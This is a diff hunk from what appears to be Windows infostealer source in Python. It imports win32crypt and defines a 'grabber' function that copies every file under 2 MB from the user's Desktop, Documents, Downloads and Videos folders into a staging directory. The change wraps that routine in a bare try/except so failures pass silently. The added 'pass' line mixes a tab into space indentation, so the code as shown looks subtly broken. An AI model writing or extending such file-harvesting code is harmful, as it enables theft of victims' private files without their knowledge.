@@ -13,19 +13,22 @@ import win32crypt
 
 
 def get_files():
-    max_size = 2 * 1024 * 1024
-    directories = {'Desktop': 'desktop', 'Documents': 'documents', 'Downloads': 'downloads', 'Videos': 'videos'}
-    permissions = 0o777
-    destination = "C:\\win_ord\\grabber"
-    for source_dir, dest_subdir in directories.items():
-        for root, dirs, files in os.walk(os.path.expanduser(f'~/{source_dir}')):
-            for file in files:
-                file_path = os.path.join(root, file)
-                if os.path.getsize(file_path) <= max_size:
-                    dest_dir = os.path.join(destination, dest_subdir, os.path.relpath(root, os.path.expanduser(f'~/{source_dir}')))
-                    os.makedirs(dest_dir, exist_ok=True)
-                    os.chmod(dest_dir, permissions)
-                    shutil.copy2(file_path, dest_dir)
+    try:
+        max_size = 2 * 1024 * 1024
+        directories = {'Desktop': 'desktop', 'Documents': 'documents', 'Downloads': 'downloads', 'Videos': 'videos'}
+        permissions = 0o777
+        destination = "C:\\win_ord\\grabber"
+        for source_dir, dest_subdir in directories.items():
+            for root, dirs, files in os.walk(os.path.expanduser(f'~/{source_dir}')):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if os.path.getsize(file_path) <= max_size:
+                        dest_dir = os.path.join(destination, dest_subdir, os.path.relpath(root, os.path.expanduser(f'~/{source_dir}')))
+                        os.makedirs(dest_dir, exist_ok=True)
+                        os.chmod(dest_dir, permissions)
+                        shutil.copy2(file_path, dest_dir)
+    except:
+	pass
 
 
 
